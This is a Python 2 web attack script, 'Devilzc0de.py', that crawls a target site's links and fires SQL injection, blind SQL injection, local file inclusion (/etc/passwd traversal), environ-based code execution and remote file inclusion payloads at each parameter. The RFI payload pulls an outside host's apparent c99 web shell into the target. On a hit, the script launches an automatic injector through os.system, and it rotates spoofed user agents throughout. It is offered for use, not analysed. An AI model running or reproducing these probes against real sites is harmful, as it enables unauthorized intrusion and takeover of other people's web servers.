#!/usr/bin/python
import os
import sys
__author__ = "mywisdom & gunslinger_"
__version__= "v4.0"
rfi = ""
myroot = "root:x:"
myua = "HTTP_USER_AGENT="
anjing="Saldiri.Org Saldiri.Org .Biz was here"
cekrfi="http://www.saldiri.org/c99.txt??"
lfis = ["../../../../../../../../../../../../../etc/passwd%00"]
rces = ["../../../../../../../../../../../../../proc/self/environ"]
pathdisclosure1="/home/"
pathdisclosure2="/var/"
pathdisclosure3="/www/"
pathdisclosure4="/html/"
pathdisclosure5="/usr/"
pathdisclosure6="/user/"
pathdisclosure7="/sites/"
pathdisclosure8="/mnt"
pathdisclosure9="/etc/"
pathdisclosure10="/web/"
penghubung=" in "
gajebo="failed to open"
l2="http://www.googlebig.com/"
cachesqli="-"
cacheblind1="-"
cacheblind100="-"
cacheblind200="-"
log = "darkjumper.log"
tanya="?"
samadengan="="
appname = os.path.basename(sys.argv[0]) 
ceksqli="'"
slash="/"
cekblind1="+order+by+1--"
cekblind100="+AND+1=1--"
cekblind200="+AND+1=2--"
mysqli1="You have an error in your SQL"
mysqli2="Division by zero in"
mysqli3="supplied argument is not a valid MySQL result resource in"
mysqli4="Call to a member function"
accesqli1="Microsoft JET Database"
accesqli2="ODBC Microsoft Access Driver"
mssqli1="Microsoft OLE DB Provider for SQL Server"
mssqli2="Unclosed quotation mark"
oracle="Microsoft OLE DB Provider for Oracle"
mscfm="[Macromedia][SQLServer JDBC Driver][SQLServer]Incorrect"
general="Incorrect syntax near"
mywisdom="http://"
gajebo="error"
sat_ahyar="=1"
sat_ahyar=str(sat_ahyar)
zubpagez="subpage.txt"
js="javascript:"
udah=0;
ouruseragent = ['Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.10 sun4u; X11)',
	'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.2pre) Gecko/20100207 Ubuntu/9.04 (jaunty) Namoroka/3.6.2pre',
	'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser;',
	'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)',
        'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)',
        'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.6)',
        'Microsoft Internet Explorer/4.0b1 (Windows 95)',
        'Opera/8.00 (Windows NT 5.1; U; en)',
	'amaya/9.51 libwww/5.4.0',
	'Mozilla/4.0 (compatible; MSIE 5.0; AOL 4.0; Windows 95; c_athome)',
	'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)',
	'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.5 (like Gecko) (Kubuntu)',
	'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; ZoomSpider.net bot; .NET CLR 1.1.4322)',
	'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; QihooBot 1.0 qihoobot@qihoo.net)',
	'Mozilla/4.0 (compatible; MSIE 5.0; Windows ME) Opera 5.11 [en]']
import urllib, sys, os, sgmllib, urllib2 , random
tmpsudah0="sitealready0.txt"
filelog = open(tmpsudah0, "w")
filelog.write ("-")
filelog.close()  


class MyParser(sgmllib.SGMLParser): 
    "A simple parser class." 
 
    def parse(self, s): 
        "Parse the given string 's'." 
        self.feed(s) 
        self.close() 
 
    def __init__(self, verbose=0): 
        "Initialise an object, sys.exit(1)ing 'verbose' to the superclass." 
 
        sgmllib.SGMLParser.__init__(self, verbose) 
        self.hyperlinks = [] 
 
    def start_a(self, attributes): 
        "Process a hyperlink and its 'attributes'." 
 
        for name, value in attributes: 
            if name == "href": 
                self.hyperlinks.append(value) 
            if name == "src": 
                self.hyperlinks.append(value) 
 
    def get_hyperlinks(self): 
        "Return the list of hyperlinks." 
 
        return self.hyperlinks 
 
 
 
if len(sys.argv) <=1:
    print "Usage : " + appname + " -mode <url> " 
    print "e.g. : " + appname + " -sqli www.google.com " 
    print "Sample mode: -sqli ,-blind, -lfi, -rfi, -rce"
    print "If you want proxy just add -p [proxyaddress:port]"
    sys.exit(1) 
elif "-h" in sys.argv: 
    print "Usage : " + appname + " -mode <url> " 
    print "e.g. : " + appname + " -sqli www.google.com " 
    print "Sample mode: -sqli ,-blind, -lfi, -rfi, -rce"
    print "If you want proxy just add -p [proxyaddress:port]"
    sys.exit(1) 
 
site = sys.argv[2].replace("http://","") 
site = "http://" + site.lower() 
mode=sys.argv[1]
proxy = "None"
for arg in sys.argv:
	if arg.lower() == '-p' or arg.lower() == '--proxy':
                proxy = sys.argv[int(sys.argv.index(arg))+1]
try: 
	if proxy != "None":
		proxyHandler = urllib2.ProxyHandler({'http' : 'http://' + proxy + '/'})
		opener = urllib2.build_opener(proxyHandler)
		opener.addheaders = [("User-Agent", random.choice(ouruseragent))]
		site_data = opener.open(site)
		parser = MyParser() 
    		parser.parse(site_data.read())
    	else:
    		site_data = urllib.urlopen(site) 
    		parser = MyParser() 
    		parser.parse(site_data.read()) 
except(IOError),msg: 
    	print "Error in connecting site ", site 
    	print msg 
    	sys.exit(1)  
except KeyboardInterrupt:
	print "\n[-] Scan has been skiped...\n"
	sys.exit(1)
	
links = parser.get_hyperlinks() 
print ""
print "-" * 30 
print "Devilzc0de.py %s" % (__version__)
print "Developed by %s" % (__author__)
print "Searching sqli,blind,rfi and lfi and search path disclosure at your target"
print "-" * 30
print "Every w00t message will be logged at %s ,check the log after scanning finished" % log
print "To skip this site press \"crtl+c\""
l2=site
urlbuta=site+slash
url_rfi_basic=site+slash
url_lfi_basic=site+slash
z=0
data=""
x=0
text="-"
f=""
joomla="option=com_"
pa=0
tempsub="-"
tempsubfile="tmpsub.txt"
tmpcekfile="tmpcek.txt"
filelog = open(tmpcekfile, "w")
filelog.write ("-")
filelog.close()  
			
for l in links: 
	z=z+1
	if z>200:
		sys.exit(1)
        if joomla in l:
		print "[-] [-]  Sorry "+site+" is joomla!!! this tool can not scan for joomla!!"
		filelog = open(log, "a")
	        filelog.write ("\n[-] [-]  Sorry "+site+" is joomla!!! this tool can not scan for joomla!!") 
	        sys.exit(1)
	if mode=='-sqli':
		z=z+1
         	if z>200:
	        	sys.exit(1)
		htmlsqli=""
		nemu="no"
		tipe=""         
		if samadengan in l and tanya in l:
			if mywisdom not in l:
		               l2=l+ceksqli
			       
		               if site not in l2:
				        l2=site+slash+l2
		              
                        else :
			       if site in l:
				       l2=l+ceksqli
		        if samadengan in l2:
			  f = open(tmpcekfile, "r")
                          text = f.read()
			  f.close()
			  cegah="("
			  if l2 not in text and cegah not in text:
                            print "[-] Checking sqli at : "+l2  
                            try:   
		            	response=urllib.urlopen(l2)
                            	htmlsqli = response.read()  
			    	filelog = open(tmpcekfile, "a")
                            	filelog.write ("\n"+l2)
			    	filelog.close()  
			    except KeyboardInterrupt:
				  print "\n[-] Sqli scan skiped...\n"
				  sys.exit(1)
	        else:
		     if mywisdom not in l:
		               l2=l
			    
		               if site not in l2:
				        l2=site+slash+l2
		              
                     else :
			       if site in l:
				       l2=l
		     filelog = open(zubpagez, "a")
                     filelog.write ("-")
	             filelog.close()  
		
		     f = open(zubpagez, "r")
                     text = f.read()
		     f.close()
		     
		     if l2 not in text and js not in l2 and udah < 2: 
		          filelog = open(zubpagez, "a")
                          filelog.write ("\n"+l2+"\n")
		          filelog.close()
			  udah=udah+1
	             if udah > 1 :
			  udah=0
		if mysqli1 in htmlsqli:
			nemu="yes"
			tipe="mysql injection"
	        elif mysqli2 in htmlsqli:
		       	nemu="yes"
			tipe="mysql injection"
		elif mysqli3 in htmlsqli:
		       	nemu="yes"
			tipe="mysql injection (error fetching array)"
		elif mysqli4 in htmlsqli:
		       	nemu="yes"
			tipe="oop application bug"
		elif accesqli1 in htmlsqli:
			nemu="yes"
			tipe="ms access sql injection"
		elif accesqli2 in htmlsqli:
			nemu="yes"
			tipe="ms access sql injection"
		elif mssqli1 in htmlsqli:
			nemu="yes"
			tipe="mssql injection"
		elif mssqli2 in htmlsqli:
			nemu="yes"
			tipe="mssql injection"
		elif oracle in htmlsqli:
			nemu="yes"
			tipe="oracle sql injection"
		elif mscfm in htmlsqli:
			nemu="yes"
			tipe="cfm mssql injection"
		elif general in htmlsqli:
			nemu="yes"
			tipe="unidentified sql injection"
		if nemu=='yes':
			print "[+] W00t !! Found "+ tipe+ " Bug at : "+l2
			print "[+] Possible server's hole saved at darkjumper.log"
			if tipe == mysqli1 or mysqli2:
				if sys.platform == 'linux-i386' or sys.platform == 'linux2' or sys.platform == 'darwin':
	      				autoinjector = "./injector.py -t %s" % site+slash+l
	  		      	else:
    					autoinjector = "injector.py -t %s" % site+slash+l
			print "[+] Running autoinjector..."
			print "[+] Please wait..."
			print "[+] Press \"ctrl+c\" to skip autoinjector..."
			os.system(autoinjector)
			filelog = open(log, "a")
			filelog.write ("\n[+] W00t !! Found "+ tipe+ " Bug at : "+l2) 
                #tes path disclosure
		tahap2=l2.split('=')
		ceksqlix="''"
		lx=tahap2[0]+sat_ahyar+ceksqlix
		
		f = open(tmpcekfile, "r")
                text = f.read()
		f.close()
			  
		if tanya in lx and z<3:
			if lx not in text:
		    		print "[-] Checking path disclosure at : "+lx
				try:
		    			response=urllib.urlopen(lx)
		    			htmlsqli = response.read()   
		    			filelog = open(tmpcekfile, "a")
                    			filelog.write ("\n"+lx)
	           			filelog.close()  		
	       		 	except KeyboardInterrupt:
					print "\n[-] Path disclosure scan has been skiped...\n"
					sys.exit(1)
			if mysqli1 in htmlsqli:
				nemu="yes"
				tipe="mysql injection"
		        elif mysqli2 in htmlsqli:
			     	nemu="yes"
				tipe="mysql injection"	
		  	elif accesqli1 in htmlsqli:
				nemu="yes"
				tipe="ms access sql injection"
			elif accesqli2 in htmlsqli:
				nemu="yes"
				tipe="ms access sql injection"
			elif mssqli1 in htmlsqli:
				nemu="yes"
				tipe="mssql injection"
			elif mssqli2 in htmlsqli:
				nemu="yes"
				tipe="mssql injection"
			elif oracle in htmlsqli:
				nemu="yes"
				tipe="oracle sql injection"
			elif mscfm in htmlsqli:
				nemu="yes"
				tipe="cfm mssql injection"
			elif general in htmlsqli:
				nemu="yes"
				tipe="unidentified sql injection"
			elif gajebo in htmlsqli:
				nemu="yes"
				tipe="unidentified error message"
			elif pathdisclosure1 in htmlsqli and penghubung in htmlsqli:
				nemu="yes"
				tipe="path discosure /home/"
				pa=pa+1
			elif pathdisclosure2 in htmlsqli and penghubung in htmlsqli:
				nemu="yes"
				tipe="path disclosure /var/"
			elif pathdisclosure3 in htmlsqli and penghubung in htmlsqli:
				nemu="yes"
				tipe="path disclosure /www/"
			elif pathdisclosure4 in htmlsqli and penghubung in htmlsqli:
				nemu="yes"
				tipe="path disclosure /html/"
			elif pathdisclosure5 in htmlsqli and penghubung in htmlsqli:
				nemu="yes"
				tipe="path disclosure /usr/"
			elif pathdisclosure6 in htmlsqli and penghubung in htmlsqli:
				nemu="yes"
				tipe="path disclosure /user/"
			elif pathdisclosure7 in htmlsqli and penghubung in htmlsqli:
				nemu="yes"
				tipe="path disclosure /sites/"
			elif pathdisclosure8 in htmlsqli and penghubung in htmlsqli:
				nemu="yes"
				tipe="path disclosure /mnt/"
			elif pathdisclosure9 in htmlsqli and penghubung in htmlsqli:
				nemu="yes"
				tipe="path disclosure /etc/"
			elif pathdisclosure10 in htmlsqli and penghubung in htmlsqli:
				nemu="yes"
				tipe="path disclosure /web/"
		
		  	if nemu=='yes':
				print "[+] W00t !! Found "+ tipe+ " Bug at : "+lx
				print "[+] Possible server's hole saved at darkjumper.log"
				if tipe == mysqli1 or mysqli2:
					if sys.platform == 'linux-i386' or sys.platform == 'linux2' or sys.platform == 'darwin':
	      					autoinjector = "./injector.py -t %s" % site+slash+l
	  		      		else:
    						autoinjector = "injector.py -t %s" % site+slash+l
				print "[+] Error type is mysql so we will running autoinjector"
				print "[+] Running autoinjector..."
				print "[+] Please wait..."
				print "[+] Press \"ctrl+c\" to skip autoinjector..."
				os.system(autoinjector)
				filelog = open(log, "a")
				filelog.write ("\n[+] W00t !! Found "+ tipe+ " Bug at : "+lx) 
		
	elif mode=='-sqlisub':
		z=z+1
		php="php"
         	if z>200:
	        	sys.exit(1)
		htmlsqli=""
		nemu="no"
		tipe=""
		tmpsudah0="sitealready0.txt"
		f = open(tmpsudah0, "r")
                text = f.read()
          	f.close()
	        if l not in text:
                    print l+"\n"	
		    filelog = open(log, "a")
		    filelog.write("\nScanning sub page\n")
		    filelog.write ("\n sqlisub:"+l) 
		    filelog.close()
	# blind sql mode !
	elif mode=='-blind':
		z=z+1
         	if z>40:
	        	sys.exit(1)
		nemu="no"
		l1=urlbuta
		l100=urlbuta
		l200=urlbuta
		if samadengan in l:
			if mywisdom not in l:
		               l1=l+cekblind1
		               if site not in l1:
				        l1=site+slash+l1
			       l100=l+cekblind100
		               if site not in l100:
				        l100=site+slash+l100
			       l200=l+cekblind200
		               if site not in l200:
				        l200=site+slash+l200
                        else :
			       temp="-"
			       temp2="-"	
			       if site in l:
				       l1=l+cekblind1
				       l100=l+cekblind100
				       l200=l+cekblind200
                        if samadengan in l1:		
			  	f = open(tmpcekfile, "r")
                          	text = f.read()
			  	f.close()
			  	cegah="("

			if l1 and "(" not in text:
		            	print "[-] Saving response length for blind sqli at :"+l1  
		            	try:   
		            		response=urllib.urlopen(l1)
                            		cacheblind1 = response.read()
			    		filelog = open(tmpcekfile, "a")
                            		filelog.write ("\n"+l1)
	                    		filelog.close() 
	                    	except KeyboardInterrupt:
				  	print "\n[-]  Skip...\n"
				  	sys.exit(1)
			  
			if samadengan in l100:
			  	f = open(tmpcekfile, "r")
                          	text = f.read()
			  	f.close()
			  	cegah="("
			 
			if l100 and "(" not in text: 
		            	print "[-] Saving response length for blind sqli at :"+l100  
		            	try:   
		            		response=urllib.urlopen(l100)
                            		cacheblind100 = response.read()
			    		filelog = open(tmpcekfile, "a")
                            		filelog.write ("\n"+l100)
	                    		filelog.close() 
	                    	except KeyboardInterrupt:
				  	print "\n[-] blind sql scan has been skiped...\n"
				  	sys.exit(1)

			panjangblind1=len(cacheblind1)
			panjangblind100=len(cacheblind100)
			
			if panjangblind1!=panjangblind100:
				  if samadengan in l200 and "(" not in l200:
		                    	print "[-] Saving response length for blind sqli at :"+l200   
		                    	try:  
		                    		response=urllib.urlopen(l200)
                                    		cacheblind200 = response.read()
			            		response=urllib.urlopen(l200)
                                    		cacheblind200 = response.read()
			            		panjangblind200=len(cacheblind200)
			            	except KeyboardInterrupt:
				  		print "\n[-] blind sql scan has been skiped...\n"
				  		sys.exit(1)
				  if panjangblind200 != panjangblind100:
				    	print "[-] I dont guarantee blind scanning is accurate"
			            	print "[+] W00t !! Found Possible Blind sqli or sqli Bug at : "+l100
				    	print "[+] Possible server's hole saved at darkjumper.log"
				    	if sys.platform == 'linux-i386' or sys.platform == 'linux2' or sys.platform == 'darwin':
	      					autoinjector = "./injector.py -t %s" % site+slash+l
	  		      	    	else:
    						autoinjector = "injector.py -t %s" % site+slash+l
    				    	print "[+] Running autoinjector..."
					print "[+] Please wait..."
					print "[+] Press \"ctrl+c\" to skip autoinjector..."
				    	os.system(autoinjector)
				    	filelog = open(log, "a")
				    	filelog.write ("\n[-] I dont guarantee blind scanning is accurate")
			            	filelog.write ("\n[+] W00t !! Found Possible Blind sqli or sqli Bug at : "+l100) 
#			else:
				# print "[-] Sorry no possible blind found here !"
	# lfi mode !
	elif mode=='-lfi':
	      lfi=site+slash
	      urlbad=lfi
	      z=z+1
	      if z>40:
	        	sys.exit(1)
              for ceklfi in lfis:  
                 htmllfi="alabala ngentot akun darkc0denya udah gw 0wned hahahaha"
		 cegah="("
		 if samadengan in l and cegah not in l:
                    	if mywisdom not in l:
			       beforelfi=l.split('=')
			       pj=len(beforelfi)
                               da=0
                               kont=""
			       for x in beforelfi:
				    da=da+1
                                    if da<pj:
	                               kont=kont+x+"="
		               lfi=kont+ceklfi
		               if site not in lfi:
				        lfi=site+slash+lfi
                        else :
			       if site in l:
				       beforelfi=l.split('=')
			               pj=len(beforelfi)
                                       da=0
                                       kont=""
			               for x in beforelfi:
                                           da=da+1
                                           if da<pj:
				         	   kont=kont+x+"="
				       lfi=kont+ceklfi
		        if lfi!="":
		           f = open(tmpcekfile, "r")
                           text = f.read()
			   f.close()
			   if lfi not in text and urlbad!=lfi:
			     print "[-] Checking lfi at : "+lfi     
		             try:
			       response=urllib.urlopen(lfi)
			       htmllfi = response.read()   
			       filelog = open(tmpcekfile, "a")
                               filelog.write ("\n"+lfi)
	                       filelog.close() 
			     except(IOError),msg: 
                             	  print "Error in testing url: ", lfi
                             	  print msg 
                      	     except KeyboardInterrupt:
				  print "\n[-] Lfi scan has been skiped...\n"
				  sys.exit(1)
			if myroot in htmllfi:
			      		print "[+] W00t !! Found lfi Bug at : "+lfi
	                 		print "[+] Possible server's hole saved at darkjumper.log"
			                filelog = open(log, "a")
					filelog.write ("\n[+] W00t !! Found lfi Bug at : "+lfi) 
#		      	else:
#				if lfi not in text:
					# print "[-] Sorry no bug on this url !"	 	
		 if samadengan in l:
			if mywisdom not in l:
		               lfi=l
		               if site not in lfi:
				        lfi=site+slash+lfi
                        else :
			       if site in l:
				       lfi=l
				       
		        tahap3=lfi.split('=')
			lfix=tahap3[0]+samadengan+ceklfi
			f = open(tmpcekfile, "r")
                        text = f.read()
			f.close()
			if lfix not in text  and urlbad!=lfix:  
		          cegah="("
			  if tanya in lfix and cegah not in lfix:
		              print "[-] checking lfi at : "+lfix
		    
                          try:
			      response=urllib.urlopen(lfix)
			      htmllfi = response.read()   
			      filelog = open(tmpcekfile, "a")
                              filelog.write ("\n"+lfix)
	                      filelog.close() 
			 
			  except(IOError),msg: 
                              print "Error in testing url: ", lfix
                              print msg 
                      	  except KeyboardInterrupt:
				print "\n[-] Lfi scan has been skiped...\n"
				sys.exit(1)
			      
		        if myroot in htmllfi:
			      		print "[+] W00t !! Found lfi Bug at : "+lfix
	                 		print "[+] Possible server's hole saved at darkjumper.log"
			                filelog = open(log, "a")
					filelog.write ("\n[+] W00t !! Found lfi Bug at : "+lfix) 
#	          	else:
#				if lfix not in text:
					# print "[-] Sorry no bug on this url !"	 	
					
	# rce mode !
        elif mode=='-rce':
	      lfi=site+slash
	      urlbad=lfi
	      z=z+1
	      if z>40:
	        	sys.exit(1)
              for cekrce in rces:  
                 htmllfi="alabala ngentot akun darkc0denya udah gw 0wned hahahaha"
		 cegah="("
		 if samadengan in l and cegah not in l:
                    	if mywisdom not in l:
			       beforerce=l.split('=')
			       pj=len(beforerce)
                               da=0
                               kont=""
			       for x in beforerce:
				    da=da+1
                                    if da<pj:
	                               kont=kont+x+"="
		               rce=kont+cekrce
		               if site not in rce:
				        rce=site+slash+rce
                        else :
			       if site in l:
				       beforerce=l.split('=')
			               pj=len(beforerce)
                                       da=0
                                       kont=""
			               for x in beforerce:
                                           da=da+1
                                           if da<pj:
				         	   kont=kont+x+"="
				       rce=kont+cekrce
		        if rce != "":
		           f = open(tmpcekfile, "r")
                           text = f.read()
			   f.close()
			   if rce not in text and urlbad != rce:
			     print "[-] Checking rce at : "+rce    
		             try:
			       response=urllib.urlopen(rce)
			       htmllfi = response.read()   
			       filelog = open(tmpcekfile, "a")
                               filelog.write ("\n"+rce)
	                       filelog.close() 
			     except(IOError),msg: 
                             	  print "Error in testing url: ", rce
                             	  print msg 
                      	     except KeyboardInterrupt:
				  print "\n[-] Rce scan has been skiped...\n"
				  sys.exit(1)
			if myua in htmllfi:
			      		print "[+] W00t !! Found rce Bug at : "+rce
	                 		print "[+] Possible server's hole saved at darkjumper.log"
			                filelog = open(log, "a")
					filelog.write ("\n[+] W00t !! Found rce Bug at : "+rce) 
#		      	else:
#				if rce not in text:
					# print "[-] Sorry no bug on this url !"	 	
		 if samadengan in l:
			if mywisdom not in l:
		               lfi=l
		               if site not in rce:
				        rce=site+slash+rce
                        else :
			       if site in l:
				       rce=l
				       
		        tahap3=rce.split('=')
			rcex=tahap3[0]+samadengan+cekrce
			f = open(tmpcekfile, "r")
                        text = f.read()
			f.close()
			if rcex not in text  and urlbad!=rcex:  
		          cegah="("
			  if tanya in rcex and cegah not in rcex:
		              print "[-] checking rce at : "+rcex
                          try:
			      response=urllib.urlopen(rcex)
			      htmllfi = response.read()   
			      filelog = open(tmpcekfile, "a")
                              filelog.write ("\n"+rcex)
	                      filelog.close() 
			  except(IOError),msg: 
                              print "Error in testing url: ", rcex
                              print msg 
                      	  except KeyboardInterrupt:
				print "\n[-] Rce scan has been skiped...\n"
				sys.exit(1)
			      
		        if myua in htmllfi:
			      		print "[+] W00t !! Found rce Bug at : "+rcex
	                 		print "[+] Possible server's hole saved at darkjumper.log"
			                filelog = open(log, "a")
					filelog.write ("\n[+] W00t !! Found rce Bug at : "+rcex) 
#	          	else:
#				if rcex not in text:
					# print "[-] Sorry no bug on this url !"	
	# rfi mode !	      	 
	elif mode=='-rfi':
	   	 z=z+1
		 rfi=site+slash
		 urlbad=rfi
         	 if z>50:
	        	sys.exit(1)
		 htmlrfi="alabala ngentot akun darkc0denya udah gw 0wned hahahaha"
		 if samadengan in l:
                    	if mywisdom not in l:
			       beforerfi=l.split('=')
			       pj=len(beforerfi)
                               da=0
                               kont=""
			       for x in beforerfi:
				    da=da+1
                                    if da<pj:
	                               kont=kont+x+"="

		               rfi=kont+cekrfi
		               if site not in rfi:
				        rfi=site+slash+rfi  
                        else :
			       if site in l:
				       beforerfi=l.split('=')
			               pj=len(beforerfi)
                                       da=0
                                       kont=""
			               for x in beforerfi:
                                           da=da+1
                                           if da<pj:
				         	   kont=kont+x+"="
				       rfi=kont+cekrfi
	                f = open(tmpcekfile, "r")
                        text = f.read()
			f.close()
			cegah="("
			if rfi not in text and urlbad!=rfi and cegah not in text:
		          if rfi!="":
		             print "[-] Checking rfi at : "+rfi     
		             try:
			        response=urllib.urlopen(rfi)
			        htmlrfi = response.read()   
			     except(IOError),msg: 
                                print "Error in testing url: ", rfi
                                print msg 
                      	     except KeyboardInterrupt:
				print "\n[-] Rfi scan has been skiped...\n"
				sys.exit(1)
		             filelog = open(tmpcekfile, "a")
                             filelog.write ("\n"+rfi)
	                     filelog.close() 	
			if anjing in htmlrfi:
			      		print "[+] W00t !! Found rfi Bug at : "+rfi
	                 		print "[+] Possible server's hole saved at darkjumper.log"
			                filelog = open(log, "a")
					filelog.write ("\n[+] W00t !! Found rfi Bug at : "+rfi) 
                        else:
				         if rfi not in text:
					   print "[-] Sorry no bug on this url!"
	         if samadengan in l:
			if mywisdom not in l:
		               rfi=l
		               if site not in rfi:
				        rfi=site+slash+rfi     
                        else :
			       if site in l:
				       rfi=l
		        tahap3=rfi.split('=')
			rfix=tahap3[0]+samadengan+cekrfi
			f = open(tmpcekfile, "r")
                        text = f.read()
			f.close()
			if rfix not in text and urlbad!=rfix:
		          if tanya in rfix:
		              print "[-] Checking rfi at : "+rfix
		    
                          try:
			  	response=urllib.urlopen(rfix)
			  	htmlrfi = response.read()   
			  except(IOError),msg: 
                              	print "Error in testing url: ", rfix
                              	print msg 
                      	  except KeyboardInterrupt:
				print "\n[-] Rfi scan has been skiped...\n"
				sys.exit(1)                          
			  filelog = open(tmpcekfile, "a")
                          filelog.write ("\n"+rfix)
	                  filelog.close() 
			     
		        if anjing in htmlrfi:
			      		print "[+] W00t !! Found rfi Bug at : "+rfix
	                 		print "[+] Possible server's hole saved at darkjumper.log"
			                filelog = open(log, "a")
					filelog.write ("\n[+] W00t !! Found rfi Bug at : "+rfix) 
#                        else:
#				         if rfix not in text:
#					   print "[-] Sorry no bug on this url!";
